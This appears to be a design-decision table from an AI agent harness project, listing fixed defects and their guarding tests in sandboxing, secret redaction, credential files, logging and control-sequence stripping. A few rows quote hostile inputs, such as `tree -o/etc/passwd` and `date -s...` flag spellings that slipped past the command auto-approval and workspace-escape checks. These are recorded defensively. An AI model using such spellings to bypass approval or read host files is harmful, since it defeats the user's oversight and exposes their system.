| **Expecting the count check to notice one removed `# nosec` on a triaged pair** | it will not, and the slack is measured | Batch 141. All 18 sandbox B603 sites are annotated, so live is 0 while the baseline still says 7 -- the check fires at 8 removals, verified by removing them one at a time (green at 1, 4, 7; red at 8). The seven baseline rows can no longer match anything, which makes them the same inert entries the header keeps for the 65 B105/B106 ones. Dropping them sharpens the check and is an edit to a triaged file, so it is a reviewed step rather than tidying |
| **Relying on the count check while a file fails to parse** | `scripts/bandit-count-check.py` itself, since batch 141 | A file bandit cannot read has no findings, which reads as a DECREASE and passes -- so a syntax error switched the check off for exactly the file being edited. Found because mutation A7 cut an annotation mid-sentence and the script said "none grew". It now fails on bandit's `errors` list |
| **Starting a background SSH session without the askpass window** | `test_the_session_and_the_one_shot_agree_for_the_same_store` | Batch 142 (S02-02). `_ssh_auth_options` takes `BatchMode=yes` OFF as soon as anything is stored for the host -- BatchMode suppresses askpass too, so the anti-hang property moves to `SSH_ASKPASS_REQUIRE=force` (measured: 20s hung without it, 0.8s with). `start_sandboxed` passed a bare `_ssh_env()`: four askpass variables on the one-shot path and NONE on the session path, same store, same host. The guard is a RELATION rather than a list, so a variable added to one path and not the other fails whichever one it was |
| **Scoping a session's credential window to the call that starts it** | `test_the_listener_is_closed_when_the_session_is_killed` and `test_killing_a_session_that_already_ended_still_releases` | Batch 142 (S02-02/S02-04). `askpass.serving` and `secrets.guarded` are BLOCKS and a session is not -- `start_sandboxed` returns while the process keeps running, so a block around the start closes the window before the connection needs it. The session owns it and `release_credentials` closes it on the kill or on the first `poll`/`wait` that sees the process gone. The cleanup goes through `serving.__exit__`, NOT `_cleanup`: the exception is what locks the store (SS60) and that trigger has to survive the window being hand-held. The release is in one `finally` round the whole of `kill()` because it has four exits and the tests found two that skipped it |
| **Holding a session's sudo plaintext outside `secrets.guarded`** | `test_a_root_session_holds_the_plaintext_inside_a_guard` | Batch 142 (S02-04). Both one-shot routes wrap the window; the session route wrapped nothing, on the route that holds it LONGEST. Asserted as an ORDER, not a call count -- what was wrong was not that `guarded` was missing from the file but that the span was outside it |
| **Reporting a one-shot fallback timeout without reclaiming the group** | `test_the_group_is_signalled_and_not_only_the_shell` | Batch 142 (S02-03). H7, quoted in this module's own `SessionProcess` docstring: a bound that reports a timeout must have STOPPED the work. Measured: the call returned on time, 3.00s against a 3s bound, and `pgrep -a sleep` listed FOUR survivors -- and the control in the same run showed `start_new_session=True` alone changes nothing, because nothing signalled the group. `_terminate_tree`/`_force_tree` are the SESSION path's answer shared rather than copied (EP6) |
| **Draining the pipes after a kill with no timeout** | `test_the_drain_is_bounded_so_an_orphan_cannot_hold_the_call` | Batch 142 (S02-03, the Windows half). `communicate()` waits for EOF and an orphaned grandchild still holds the write end -- 30.21s against a 5s bound, measured, and unbounded in principle. The test asserts the ARGUMENT, not the returned dict: the double raises on a call count, so a result-only assertion stayed green when the bound was removed |
| **Calling `os.killpg(proc.pid, ...)` on a child that may not lead a group** | `_leads_its_own_group`, asked before every signal since batch 142 | `os.killpg` takes a process GROUP id. A child started WITHOUT `start_new_session` sits in this process's group, so passing its pid as a group means either no such group (ESRCH) or somebody else's processes. Both launch sites set the flag today, so this keeps that true rather than fixing a live defect -- a change at either one can no longer turn a kill of the work into a kill of the harness |
| **Giving the one-shot fallback `_isolation_kwargs()`** | `test_the_child_leads_its_own_group_on_posix_only` | Batch 142. That is the SESSION's answer and carries `CREATE_NEW_PROCESS_GROUP` on Windows too. A session is stopped from elsewhere through `kill()`; a one-shot is waited on in the function itself, so taking it out of the console's group on Windows would only stop Ctrl+C reaching it while `taskkill /T` already reclaims the tree by pid. On POSIX the flag is required for the killpg, and what it costs is paid by `except BaseException` -- an interrupt reclaims before it unwinds, or the fix trades a timeout orphan for an interrupt orphan |
| **Memoising a FAILED `wslpath` translation** | `test_a_failure_leaves_the_cache_as_it_found_it` | Batch 142 (S02-07). One non-zero `wslpath` cached `""` for the life of the process and the backend stayed down until the user restarted -- while the refusal named a cause (a UNC path, an unmounted drive) that was not what happened. The two likeliest causes are transient: the distro's service still starting, and a loaded machine missing a 10s deadline. `_wsl_workspace_memo` RAISES and the wrapper returns `""`, because `lru_cache` stores a return value and never an exception -- so "only a success is remembered" is a property of the cache and not a rule the body has to keep. The cache moved name: `_wsl_workspace.cache_info()` is now `_wsl_workspace_memo` |
| **Matching a dangerous flag by its exact spelling** | `test_every_spelling_the_parser_accepts_is_not_inert` | Batch 142 (S01-01). Batch 117 made the table true for the spellings it ENUMERATED; GNU `date` and `tree` parse with `getopt_long`, where a short option takes its argument ATTACHED and an unambiguous long prefix resolves. `date -s2024-01-01`, `date --s 2024-01-01`, `date --se=2024-01-01`, `tree -oout.txt` and `tree -ao out.txt` all profiled `INERT, writes=False` and ran with no prompt. The direction errs toward ASKING, so `tree -Pfoo` is refused and that is the accepted cost of not parsing (G2) -- but `--setting` is NOT read as `--set`, because getopt rejects it and a rule that matched it would refuse every long flag sharing a dangerous one's letters |
| **Reading a token as a path without reading what a flag carries** | `test_an_attached_path_does_not_hide_from_the_escape_check` | Batch 142, and it corrects S01-01's own severity argument. The report says the boundary holds because `_escapes_workspace` reads every token as a path. Measured: `tree -o /etc/passwd` escapes and `tree -o/etc/passwd` does NOT, because a token that does not start with `/` reads as relative and lands under the root -- so for the attached spelling neither half saw it. Not only writes: `grep -f FILE` and `file -f FILE` are INERT commands whose short option takes a file, so it was an auto-approved READ of a host file, and `file -f` echoes every unopenable line, which is the content. The clause is the `=` clause's own concession one spelling over, and that docstring had already made the argument |
| **Describing `apply_cli()`'s ordering guard as a run-time protection** | `test_no_production_call_supplies_an_override` | Batch 142 (S02-09). The guard raises on a posture CHANGE after a read, and `main.py` calls `apply_cli()` with NO arguments -- the only production call -- so `supplied` is `{}`, `candidate` equals `_posture`, and it cannot fire on a shipped launch. Three documents said otherwise. What enforces UN2 today is the source scan in `test_posture.py`, which covers IMPORT time only; a read inside `main()` above the call is caught by neither. The gate fails the day a production call gains an override and NAMES the three places, so they move with the feature rather than after it. The predicate is not the thing to revisit -- raising on the read alone was tried and was wrong twice |
| **Adding module state to `security/sandbox.py` without resetting it** | `test_every_name_the_module_holds_state_in_is_accounted_for` | Batch 142 (S02-10). `isolate_sandbox_probes` isolated three globals by name; slices 5a and 5b added two more with the same process lifetime, and `ssh_available()` reads `_ssh_auth_rejected` BEFORE the posture and the probe, so one left behind is an unavailable backend for every later test in the worker (`--dist loadscope` shares them). The list is now DERIVED from the source -- every name a function declares `global`, plus every lowercase module-level dict/set/list -- with a control asserting the derivation finds both shapes, because a version that guessed from value types answered `__builtins__`, three functions and a name that does not exist |
| **Stating a sandbox ceiling in README prose rather than the table** | `test_every_documented_ceiling_matches_the_live_config` | Batch 142 (S02-08). `sandbox_cpu_seconds` was stated twice and only the table spelling was gated, so changing it turned the row red and left the sentence saying 30 for ever -- the failure the gate's own docstring names. Measured while fixing S02-06: `--cpus 1` is the container's only CPU control, a RATE, and `SANDBOX_CPU_SECONDS` is read in exactly one place, so the row attributed the budget to the two routes that do not enforce it. The row and the prose both moved, so both templates moved with them |
| **Stating the fallback's rlimits without naming the platform** | nothing -- `_unix_resource_limits()` returning None is not a number a gate can compare | Batch 142 (S02-06). It returns None on Windows, so there that route enforces NEITHER of the two numbers README named, and with S02-01 and S02-03 open it had three bounds and none of them held. The project knew -- the module docstring says Unix-only and DEVLOG 702 records the decision; the user-facing document was the one that did not. `test_every_documented_ceiling_matches_the_live_config` cannot see this class: both numbers were right, and whether a limit BINDS is outside what it asks |
| **Removing an entry from `.github/bandit-baseline.json`** | `scripts/bandit-count-check.py`, now at full sensitivity for that file | Batch 142, ruled by the owner. Nine rows could no longer match anything (`sandbox.py` B603 7 -> 0 and B607 3 -> 1 after batch 141's annotations), which WAS the count check's blind spot: eight new subprocess findings before it fired, measured. Not a regeneration -- TECHNICAL_DEBT 22 is about re-running bandit, which rewrites every `filename` into the local path form; every kept object was carried across byte for byte, so the diff is 0 insertions and 220 deletions. ONE B607 row is kept deliberately: `Issue.__eq__` ignores the line number and the three messages are identical, so dropping all three would make the surviving live finding NEW |
| **Adding a tracked `.py` file without checking bandit against it** | the bandit job, which was RED on this branch until batch 142 | `bandit.yml` scans `git ls-files '*.py'`, so a NEW FILE's findings are new by definition -- there is no baseline row for a file that did not exist. Batch 141 created `scripts/bandit-count-check.py`, reported "both bandit checks clean", and was wrong: the run that claim rested on cannot have included the file it had just written. Four findings, annotated per site. Rewriting the baseline's paths for a local run replaces the LEADING `./` with `.\` and nothing else -- bandit on Windows emits `.\x/y.py`, so replacing every separator makes all 127 entries miss and reports the whole baseline as new |
| **Returning a math result larger than `config.MAX_READ_CHARS`** | `TestAMathResultIsBoundedAtTheProducer` | Batch 143 (S06-02), ruled by the owner. No math tool bounded its own output; the only ceiling was `tools/isolation.MAX_CHILD_OUTPUT_BYTES`, a 4 MB **transport** limit. Measured: a 14-symbol truth table from 27 characters of input returned 3,440,679 characters -- 860,169 proxy tokens, 49x `compaction_min_headroom_tokens` -- and `core/compaction.py` is explicit that nothing in this harness recovers from a prompt that overflows the window. The number is `config.MAX_READ_CHARS` rather than a new constant because `config.yaml` already calls it "the largest a single bounded read can return" and sizes the headroom from it; it is read at CALL time, and `test_the_ceiling_is_the_config_value_and_is_read_per_call` is what fails if it becomes a literal. REFUSE, not truncate: half a result is a wrong answer presented as an answer |
| **Applying that cap per recursion level instead of to the finished result** | `test_the_size_is_measured_on_the_finished_structure` | Batch 143. `_rendered` exists as a separate function so `serialize` measures once, on the whole structure. 120 rows of 120 one-character cells is 57,600 characters of JSON while every inner list is 480, so a per-level check passes a result the transport would still have to carry |
| **Enumerating a truth table before checking how many columns it has** | `test_the_rows_are_never_built` | Batch 143 (S06-02). H5's trade: refuse at the boundary rather than pay a full budget to learn the answer cannot be returned. `truth_table` materialises 2**n rows into a list where n comes from a model-supplied string, and the ceiling is on the COLUMN COUNT because that is the one math output whose size is predictable from the input. This does NOT reverse H4 -- a free-symbol count is derived from the expression and is not a parameter anyone can cap. The test patches `logic.truth_table` with a double that records and raises, because a check placed after the enumeration satisfies every other assertion in the class while still paying 1.36s and 3.4 MB for rows it throws away |
| **Changing `_MAX_TRUTH_TABLE_SYMBOLS` without the document that states it** | `test_architecture_states_the_real_truth_table_ceiling` | Batch 143. The number lives in `logic.py` and in ARCHITECTURE's tool contracts -- shape 1, a value derived in two places, which this same surface carried twice already (S06-10's four ungated copies of a test count, S06-11's 231 against a gated 230). The gate reads both, DERIVES the row count rather than letting the prose restate it, and asserts the input bound and the output bound still agree about where the edge is |
| **Calling `serialize` outside a handler in `symbolic_math`, `linear_algebra` or `geometry`** | `TestTheThreeToolsSharingSerializeCatchItsFailure` | Batch 143 (S06-03). H6 is stated generally in ROADMAP_v2 and was implemented in `discrete_math` alone -- the other three called `serialize` in the `return` statement, outside every `try`. CPython caps `int -> str` at 4,300 digits, so `determinant([["factorial(3000)","0"],["0","1"]])` left `run()` as a bare `ValueError`, came back as `exit 1` ("did not return a usable result") -- the branch `test_a_crashed_child_is_NOT_reported_as_a_limit` reserves for a harness BUG -- and handed the model 400 characters of traceback naming the install path under `C:\Users\<username>\AppData\Roaming`, which the TUI also draws at WARNING. The guard is in the `serialize` the three of them share; the tail handler is `discrete_math`'s own shape, which is what lets geometry's evaluate block stay where it is |
| **Computing nPr as `factorial(n) / factorial(n - r)`** | `TestPermutationsCostsWhatTheOperationCosts` | Batch 143 (S06-04). The cost was in `n` while the operation's cost is in `r`, and `combinations` four lines down the same chain was already O(r). Measured: `n=1000000 r=1` was 15.27s of a 20s budget and `n=3000000 r=1` was killed at the wall clock after 48.07s uncontained, while `combinations` answered the identical question from the identical two integers in 0.0002s. `sympy.ff` agrees with the form it replaced at the edges too -- `ff(5,7)` is 0 because the old form divided by `factorial(-2)` = `zoo`, and `ff(10,-1)` is `1/11`, both pinned. H4 is untouched: this is an algorithm, not a ceiling |
| **Testing a string literal with `isinstance(node.value, str)` alone** | `TestABytesLiteralIsRefusedLikeAStringLiteral` | Batch 143 (S06-05). A `bytes` constant walked past the refusal into a position no legitimate expression can occupy: `factor(b"1+1")` returned `b'1+1'` and `roots(b"x**2-1")` returned `{}`. Not an execution route on the pinned versions -- the suite's own witness-import probe, extended from `str` to `bytes` across all 213 allowlisted callables under WSL, found 117 of 213 evaluate a `str` and 0 of 213 a `bytes`, and the 117 reproduces AGENTS.md's figure exactly. Fixed anyway because the design is an allowlist so that it does not depend on that holding for the next SymPy, and `bytes` is the one non-`str` type a future evaluator would land on: `eval()` and `compile()` accept it where they reject everything else. The licensing pass still licenses `str` only, so `Symbol(b"x")` is refused -- `stringify_expr` never emits a bytes argument |
| **Returning rather than refusing past `_reject_escaped_value`'s depth cap** | `TestTheBackstopFailsClosedPastItsDepthCap` | Batch 143 (S06-09). The guard was `if _depth > 6: return`, so the one check written to catch an escape nobody anticipated had an anticipated DEPTH -- `[[[os]]]` refused, `[[[[[[[[os]]]]]]]]` accepted uninspected. The discriminating test uses an INNOCENT value past the cap, because nesting a module deeper cannot tell "raises at the cap" from "the cap was deleted and the walk went further". The cap's job is to bound the walk; the deepest legitimate shape in the battery is `eigenvects()` at 4, and `test_the_backstop_allows_every_legitimate_return_shape` is what goes red if that stops being true |
| **Deriving a truth table's columns from anything but `variables` + the undeclared free symbols** | `test_an_incomplete_list_still_covers_every_free_symbol` | Batch 143 (S06-06). The column list was `sorted(expr.free_symbols, key=str)` regardless, so neither half of `variables`' description did anything -- while the field was silently load-bearing for the parse. The undeclared half of the new list is not optional and the reason is measured: handed a list that does not cover every free symbol, SymPy's `truth_table` leaves the rest UNSUBSTITUTED and returns the symbol as the output (`truth_table(a & b, [a])` gives `([1], b)`), and `bool(Symbol('b'))` is then drawn as `true`. Declared-names-only would have replaced an ignored parameter with a wrong table |
| **Answering a propositional question about an expression that has no truth value** | `TestLogicRefusesWhatHasNoTruthValue` | Batch 143 (S06-07). `safe_parse` admits the whole 230-name allowlist and no `logic` operation checked, so `truth_table "x - 1"` came back as a confident NOT table and `"x + y"` as the truth table of OR -- which has a plausible caller, since in GF(2) `x + y` IS XOR. ONE `isinstance` against `boolalg.Boolean`, not a union of four types: `Symbol`, `BooleanTrue`, `BooleanFalse` and every `Relational` already subclass it, which was measured, and one name stays closed over whatever Boolean type a future SymPy adds. `expression_b` takes the same check -- checking one of two parsed fields is the shape this surface kept producing |
| **Leaving `symbolic_math.variable` unvalidated** | `TestTheVariableFieldMustNameOneVariable` | Batch 143 (S06-08). `sympy.Symbol` accepts any string, so a value that is not an identifier became a symbol that cannot occur in the parsed expression: `solve('x**2 - 4 = 0', variable='x, y')` returned `[]` and `differentiate('x**3', variable='x, y')` returned `'0'`, neither distinguishable in the result from a correct empty solution set or a correct zero derivative. The schema's own invitation is the trigger -- the sibling field `equations` IS a list, and the solve-a-system path ignores `variable` entirely. `pattern` is a field the pinned `google-genai` `types.Schema` carries, checked rather than assumed, so this does not widen the open GOOGLE-branch problem |
| **Building `Model(**params)` above a math tool's `try`** | `TestEveryMathToolRefusesItsOwnBadParams` | Batch 143, and S06-08's own suggested shape depended on this being false. All six tools did it, so a field constraint that fired left `run()` as a bare `pydantic.ValidationError` -- including `operation="nope"`, the most ordinary mistake a caller can make, which came back as `exit 1` with a traceback, a file and a line. H6's defect one line higher in the same function. `parse_params` contains it in all six, not just the one the finding names. Two consequences worth knowing: the message is pydantic's `err["msg"]` and not `str(exc)`, because the latter ends in an `errors.pydantic.dev` URL a model cannot act on; and every tool's `else: Unknown operation` arm is unreachable -- the `Literal` refuses first -- so the readable message those six arms were written to give is now actually given |
| **Hardcoding `symbols=` in `_split_warnings`' remedy sentence** | `test_the_remedy_names_the_field_each_tool_actually_has` | Batch 143. One shared sentence is right; one shared sentence that names a field three of its four callers have is one copy that is wrong for the fourth. `logic`'s field is `variables`, so the caller passes the name |
| **Not reporting a split name from `logic`** | `test_a_split_name_that_survives_the_domain_check_is_warned_about` | Batch 143. Batch 131 threaded `rewritten` through the three parsing tools that could not reach `symbols=` at all and left `logic` out, because `variables` already reached it -- but a caller who omits it still gets an answer about a product of single letters, and in the FUNCTIONAL spellings that answer is Boolean and therefore silent: `Xor(rain, b)`, `Not(rain)`, `Eq(rain, 5)` and `Implies(rain, b)` all parse, all pass the domain check, and `truth_table` then drew 16 rows over a, i, n, r as a success. Only the infix spellings (`rain & b`) fail loudly, and they fail naming SymPy's operand types |
| **A sink for the harness's own diagnostics composing its own redaction** | `test_no_production_module_composes_its_own_secret_redaction`, plus `TestEverySinkHasTheSameVocabulary` | Batch 144 (S07-01). `_redact_credential_shapes` is the only thing in this project that matches a credential with NO vendor prefix -- a URL's userinfo, a `<password>` element, a quoted `password =` assignment -- and it had exactly one caller, so five sinks applied `redact_secrets`' seven vendor patterns instead and one string took two vocabularies depending on where it went. Driven through the real `configure_logging`: four of issue #167's seven cases redacted in `logs/app.log` and three not, with the four as the control proving the formatter was attached while it happened. `fetch_url` logs the URL it failed on BY DESIGN, so a credentialed URL reaching the file needed no contrivance, and `core/loop.py` puts the same string in `MessageLog.error`, where `docs/PRIVACY.md` says the deletion granularity is the whole database. The gate is a SOURCE relation because fixing the five was one line each and their being five was the defect: nothing outside `safety/policy_enforcement.py` may call `redact_secrets`, since a caller outside is by definition a sink choosing a vocabulary |
| **Composing `redact_live_values` after the pattern passes** | `test_a_stored_value_containing_a_vendor_token_survives_whole` and `test_a_stored_value_containing_a_vendor_token_is_redacted_whole` | Batch 144 (S07-05). `redact_live_values` matches a stored value by exact substring, so a pattern pass that has already rewritten part of it leaves the remainder standing: measured, a stored value properly containing a `ghp_` token came back `PREFIX-[REDACTED]-SUFFIX` from the log's order and `[REDACTED]` from `redact_output_text`'s. Two sites composed the same two passes in opposite orders, one argued in a comment and one not, and nothing could say which was right. The same rule the repo has locked three times -- `fetch_url` redacts before it cuts, `param_digest` redacts before truncating, the diff block runs on whole texts -- with a substitution as the destroyer instead of a slice. The order now lives in `redact_diagnostic_text` and no sink chooses it |
| **Letting `redaction_enabled()` govern the diagnostic sinks** | `test_the_switch_does_not_govern_the_diagnostic_path` | Batch 144. `VENASTINE_REDACT_OFF` and `config.REDACT_TOOL_OUTPUTS` govern what the MODEL is shown, which a user may reasonably choose to see raw for one debugging run. They have never governed what `app.log` KEEPS across runs -- the switch's own docstring said so -- and after batch 144 the two paths differ in exactly that one respect and no other. A switch that reached the diagnostic path would turn the harness's own log into the leak |
| **Using one secret value for every redaction test in a file** | `tests/conftest.REDACTION_CASES`, `test_every_pattern_and_every_shape_has_a_case`, `test_every_case_is_matched_by_something`, `test_the_needle_is_really_in_the_text` | Batch 144 (S07-09). All three of `test_logging_setup.py`'s secret tests used one module-level `sk-ant-` key -- matched by `_SECRET_PATTERNS[1]`, so redacted by `redact_secrets` alone -- which means no assertion in the file could tell the two vocabularies apart, and the tests were green against the defect for forty-six days. The first of the protocol's four vacuity shapes: input that cannot discriminate. One list in conftest now, read by two test modules, with the relation checked BOTH ways: a pattern with no case is a pattern nothing drives, and a case no pattern matches is a case whose every assertion is vacuous. The second direction earned itself immediately -- it caught a Google API key case written 33 characters long against a pattern that wants 35 |
| **Dropping the shape rows from `REDACTION_CASES`** | `test_the_shapes_are_what_discriminates` | Batch 144. The guard on the case list. `redact_secrets` ALONE must still leave those three standing, because that is what makes the list able to tell a vendor-token-only sink from a full one. If a future vendor pattern happens to cover them, or the rows are dropped, the parity tests above would keep passing against exactly the defect they exist to catch, so this says so instead |
| **`os.replace` outside the handler that sweeps the temp file** | `test_a_failed_rename_leaves_no_provider_debris` and `test_no_envelope_debris_is_left_by_a_failed_rename` | Batch 144 (S07-02). The sweep covered the failure its own comment names and not the one next to it -- defect shape 6, and the repository's own prompt for it. A failed rename, or a process death between the two statements, left `<path>.tmp` holding exactly what was about to be written: for `providers.json` that is EVERY stored provider key in cleartext, because `save_credentials` reads the whole file, mutates one entry and writes all of it back. Driven on Windows with a happy-path control -- `PermissionError WinError 5`, destination intact, 324 bytes of debris holding both keys -- and the trigger needs no unusual state, since a plain `open()` there takes no `FILE_SHARE_DELETE` and any other process merely READING the destination makes the rename fail. The POSIX arm is clean; the process-death window is on both. `config_edit.write` had measured and answered both halves for `config.yaml`, one directory over from the helper extracted so these mechanics would have one copy |
| **Giving `write_json_atomic` a fixed `<path>.tmp` sibling again** | `test_two_writers_do_not_share_one_temp_name` | Batch 144 (S07-02). `config_edit.py:510`'s own words: "two writers raced on the one name, and a failed `os.replace` left the leftover in the install tree forever". The name is `<path>.<hex>.tmp` from `os.urandom(4)`. NOT `tempfile.mkstemp`, and the reason is measured: it creates at 0600 unconditionally and `os.replace` carries the source's mode to the destination (verified -- a 0644 destination comes out 0600), so adopting it would have silently tightened the four callers that pass no mode and falsified the docstring's "`mode` sets permissions on the TEMP FILE". The two creation branches collapsed into one `os.open` with `0o666 if mode is None else mode`, which is the mode `open(path, "w")` itself passes: measured on WSL at `umask 022`, both forms give 0o644, while `os.open` with NO mode argument gives 0o755 |
| **Dropping `O_EXCL` from the temp-file creation** | `test_the_sweep_never_deletes_a_file_this_call_did_not_create` | Batch 144. The sweep unlinks the temp file on any failure, so an open that could succeed on a path another writer created would make the cleanup delete someone else's work in progress. `O_EXCL` on a unique name is what makes the sweep safe, and the test forces a collision by pinning `os.urandom` -- the only way to collide on purpose against 4 billion names |
| **Creating `logs/app.log` without an explicit mode** | `TestTheLogFileIsOwnerOnly` | Batch 144 (S07-03). `RotatingFileHandler` takes no mode, so the log took the process umask: measured 0o644 on WSL at `umask 022`, against `providers.json` and `secrets.json` at 0o600. What it holds is "INFO and above by default ... including provider/HTTP traces ... may still contain query text" and, until S07-01 was fixed in the same batch, a third party's cleartext password. The project filed this exact shape at this exact severity for the file one directory over as issue #19, whose argument survives verbatim in `credentials.py`. The mode goes in `_open` and not at construction because ROTATION creates files too -- `doRollover` renames `app.log` to `app.log.1`, which carries the mode, then calls `_open` for a fresh one -- so a mode applied once would be right for one file in four. Windows is a no-op for the reason the four mode tests in `test_credentials.py` already skip there |
| **Repairing the mode of an app.log that already exists** | `test_an_existing_log_keeps_the_mode_it_had` | Batch 144, and this is a PINNED DECISION rather than a gap, which is the one place the log differs from `credentials.py`'s sibling (`test_rewriting_an_existing_file_repairs_a_loose_mode` pins that the provider store repairs a 0644 file on its next write). `configure_logging` records that "the user can still point AGENT_LOG_FILE anywhere they want", so a file at that path may be group-readable on purpose and tightening it silently would be this module overruling them. It ages out through rotation instead. Changing this means changing the docstring in `_OwnerOnlyRotatingFileHandler` that argues it |
| **Storing a secret value that is empty or nothing but whitespace** | `TestTheFloorRefusesWhatWouldDestroyTheOutput` | Batch 144 (S07-04), ruled by the owner. SS61 substitutes a stored value over every occurrence of it in every tool result and every log line, unconditionally and with no switch, and SS59 masks the input so the user cannot see what they typed. Measured: a stored `'    '` turned every four-space indent in every file the model reads into `[REDACTED]`. REFUSED, not stripped-and-stored -- a password with a trailing space is still that password, and silently altering a value the user cannot see is worse than refusing it. `test_a_value_may_still_contain_other_whitespace` is the negative control and it already existed, which is why this is `strip()` and not a character class |
| **Raising `MIN_SECRET_LENGTH` in the belief that it closes the class** | `test_a_four_character_word_is_still_accepted` | Batch 144 (S07-04). The owner's ruling, pinned. `'true'` is storable and a stored `'true'` turns every JSON boolean in every tool result into `[REDACTED]` -- measured -- and the floor stays 4 anyway, because no length closes the class: at 4 a stored `'pass'` destroys every Python `pass` statement and at 8 `'password'` destroys every build file. Length is a proxy for how often a value occurs in ordinary text and a poor one, since a four-character RANDOM password occurs in nothing. Also measured, and it corrects how the fork was framed: nothing re-validates a stored value on unlock, so raising the floor refuses NEW puts only and strands nothing already in the file -- the cost is a legitimate 4-7 character secret, and a short sudo password is exactly what this store holds. The constant's docstring now says what the floor is worth instead of claiming it makes SS61 survivable |
| **`recovery_hint` naming only the cause that was fixed** | `test_the_recovery_hint_names_both_causes` | Batch 144 (S07-06). It said the usual cause was "a write that was interrupted before batch 108 made them atomic", which tells someone already confused that their build is old -- while the live cause sat one function away. `create` deliberately does not go through `_write`, for the reason its own docstring gives, so it is a single non-atomic write and a crash inside it leaves exactly this state: `exists()` true, `unlock` raising `StoreUnreadable`, `create` refusing to overwrite. Driven with `test_secrets.py`'s own `_DiesMidWrite` pattern pointed at `create`. No code change -- `O_EXCL` must not become `os.replace`, which overwrites without complaint and is the TOCTOU `create` closed |
| **Asserting a logging handler by its type NAME** | `_file_handlers()` / `_stream_handlers()` in `test_logging_setup.py` | Batch 144. `configure_logging` attaches `_OwnerOnlyRotatingFileHandler` now, and the two name-based assertions did not survive that the same way: `"RotatingFileHandler" in types` failed loudly, which is fine, while `"RotatingFileHandler" not in handler_types` -- the assertion that the OSError fallback attaches NO file handler -- would have passed whether the handler was there or not. Both are `isinstance` now, which is also the question they meant to ask. The stream half excludes `FileHandler` deliberately, because `RotatingFileHandler` is itself a `StreamHandler` subclass, which is why this file compared names in the first place |
| **Asserting the absence of debris by one fixed temp name** | `_debris()` in `test_credentials.py` | Batch 144. Two assertions read `not (dir / "providers.json.tmp").exists()`, and a unique temp name leaves a membership test for a name that no longer occurs passing whatever is on disk. They ask the directory now, which is also what they always meant. `test_secrets.py`'s equivalent already listed the directory and needed no change |
| **Adding a temp-file pattern to one exclusion channel only** | `test_the_push_channel_ignores_every_sample_that_claims_it` and `test_the_archive_channel_excludes_every_sample_that_claims_it`, driven from `package.json`'s `neverDistribute` | Batch 144 (S07-02's belt and braces). The report routes this to S18, which closed at batch 142 -- but batch 140 made `neverDistribute` the one list all three channels read, so it is ONE entry and the two patterns its own gates then demand. `*.tmp` rather than `providers.json.*.tmp`: the same breadth `*.log` and `*.db` have, covering all nine of the helper's call sites rather than the two holding credentials, and no tracked file ends in `.tmp`. The trap in this widening is checked -- `providers.json.example` and `.env.example` stay tracked. One gap recorded rather than fixed: an entry DELETED from the list is caught by nothing, since the gates check that a claimed channel covers its samples and `>= 10` is the only check on the list's size |

| **Writing to a `Transcript` ingress that does not strip** | `TestNoIngressKeepsAControlSequence`, which reads the ingress set off the class | Batch 145 (S15-01). Every transcript ingress stored and drew model- and third-party text byte-for-byte, and neither layer below removes the byte: Rich keeps it through `export_text()` and textual's `Content` strips only codepoints 7, 8, 11, 12 and 13. The parametrisation sweeps seven sequence shapes over eight ingress paths, and `test_every_ingress_path_is_covered` compares its own list against `dir(Transcript)` -- so a NEW `write_*` or `*_delta` method fails here rather than quietly shipping unstripped, which is exactly how one redaction came to have five sinks in batch 144. The per-path control `test_the_surrounding_text_still_arrives` is what stops a strip that ate the line from passing every other assertion |
| **Stripping per delta instead of holding a stripper across the span** | `TestASequenceSplitAcrossDeltasIsStillRemoved` | Batch 145. The provider's chunk boundaries fall wherever it put them, so a sequence arriving in two deltas is ordinary -- the same argument `core/ansi.py` makes about a pipe, where 128 KB arrived in 74 chunks. Measured, a fresh stripper per delta is wrong TWO ways: dropping its carry turns `hi ESC [` + `2Jthere` into `hi 2Jthere`, leaving the sequence BODY as visible text, and flushing its carry per call emits the ESC outright. The answer and reasoning spans hold SEPARATE strippers for the reason `_thinking_pending` is separate from `_pending`: they interleave, and with one shared, a CSI left open by the answer terminated on the reasoning chunk's first character -- `t` is 0x74, inside the CSI final-byte range -- and ate it. The cut is swept over every offset inside the sequence rather than one chosen to pass, which is this file's idiom for the chunking claims |
| **Giving `AnsiStripper` one answer for an unterminated carry** | `TestTheUnterminatedCarryHasTwoContracts` | Batch 145. This is the one thing the module's two consumers genuinely disagree about, which is why it is a flag and not a rule. For the pty a carry that never completed is TEXT -- a program's output cut off mid-sequence is still the output the agent asked for, and holding it forever would lose it. For a transcript the same release is a leak, because the text there is handed to a terminal and `ESC [` with no final byte consumes whatever is printed after it. The flag governs BOTH releases, `flush` and the `_MAX_CARRY` overflow, because they are one event by two routes and covering one would leave the other as the way out. The pty's answer is the DEFAULT and is pinned here, so a change of default fails in this file rather than silently in every interactive session |
| **Removing only the ESC spelling of a control sequence** | `TestBothSpellingsOfAControlAreRemoved` | Batch 145, found by S15's question and fixed in S16's module because the stripper is shared. Every sequence has an 8-bit form -- U+009B is the same CSI introducer as `ESC [`, decoded from `\xc2\x9b` on the wire -- and `_sequence_end` keyed on ESC alone, so all seven introducers reached the agent's buffer, the user's screen and the transcript while the ESC spelling of each was removed. Not a judgement about them: they were never considered. The guard is a RELATION, that the two spellings of each shape strip identically, because asserting each output separately would be two lists to keep in step -- and `test_each_spelling_is_actually_different_text` is its control, since two identical inputs would satisfy the relation while testing one spelling twice. The whole C1 range goes, not only the introducers: `ESC D` and `ESC E` already went through the two-character fallback and U+0084/U+0085 are those same controls |
| **Making `Transcript` log what it stripped** | `test_the_widget_still_does_no_logging` | Batch 145, and a PINNED DECISION rather than a gap. The ruling was that the text says nothing and the log says it once; the log line lives in `tui/app.py`'s `on_turn_finished` and the widget only counts. `Transcript`'s own contract is that "write* does no logging, so a handler feeding a widget that logs cannot loop here", and `on_log_record_message` routes records straight back into `write_role` -- so a Transcript that logged while writing would make that sentence false, which is defect shape 9 authored in the file being fixed. The record is INFO, not WARNING: `TranscriptLogHandler` is WARNING+, and a model that emitted a colour code is not a warning |
| **Drawing anything in place of a stripped sequence** | `test_nothing_is_drawn_in_place_of_the_sequence` | Batch 145, the other half of the same ruling. `core/ansi.py`'s locked answer for the pty is that a sequence is REMOVED and never interpreted, and a visible marker would be a second answer to that -- in the one place a model can type the marker itself, which is the spoof `[REDACTED]` already accepts for the redactor. The test compares the entries AND the drawn rows against the same text with no sequence in it at all, so `_entries`, the screen, `/copy` and the replay stay byte-identical to one another |
